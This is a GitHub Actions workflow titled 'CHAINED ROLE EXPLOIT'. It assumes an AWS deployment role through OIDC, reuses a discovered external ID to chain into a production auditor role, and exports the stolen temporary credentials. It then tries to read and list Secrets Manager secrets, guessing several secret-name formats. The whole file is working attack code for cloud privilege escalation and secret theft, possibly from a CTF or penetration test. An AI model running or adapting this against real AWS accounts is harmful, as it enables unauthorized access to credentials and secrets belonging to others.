name: CHAINED ROLE EXPLOIT - ExtID as Secret Path

on:
  workflow_dispatch:
  push:

jobs:
  exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
    - name: Step 1 - Assume GitHub Deployment Role
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
        aws-region: us-west-1
        role-session-name: GitHubOIDCExploit
        role-external-id: "internal/secrets/id-v2"
        
    - name: Step 2 - Chain to Prod Readonly Auditor Role
      run: |
        echo "ðŸ”— ATTEMPTING ROLE CHAINING..."
        # Use the external ID we found to assume the audit role
        CREDS=$(aws sts assume-role \
          --role-arn "arn:aws:iam::170974506515:role/prod-readonly-auditor" \
          --role-session-name "ChainedAuditAccess" \
          --external-id "internal/secrets/id-v2" \
          --query 'Credentials' \
          --output json 2>/dev/null)
          
        if [ $? -eq 0 ]; then
          echo "âœ… ROLE CHAINING SUCCESSFUL!"
          export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
          export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')  
          export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
          
          echo "New identity:"
          aws sts get-caller-identity
          
          echo "ðŸŽ¯ TRYING SECRET ACCESS WITH AUDIT ROLE..."
          aws secretsmanager get-secret-value --secret-id "internal/secrets/id-v2" --region us-west-1 || echo "Secret access failed"
          
          echo "ðŸ“‹ LISTING SECRETS WITH AUDIT ROLE..."
          aws secretsmanager list-secrets --region us-west-1 || echo "List failed"
          
        else
          echo "âŒ Role chaining failed"
        fi
        
    - name: Step 3 - Try ExtID as Different Secret Formats
      run: |
        echo "ðŸŽ² TRYING EXTERNAL ID AS SECRET NAME IN DIFFERENT FORMATS..."
        
        # The external ID might be the actual secret name
        for format in "internal/secrets/id-v2" "internal-secrets-id-v2" "internal_secrets_id_v2" "/internal/secrets/id-v2"; do
          echo "Trying format: $format"
          aws secretsmanager get-secret-value --secret-id "$format" --region us-west-1 2>/dev/null && echo "SUCCESS: $format" || echo "Failed: $format"
        done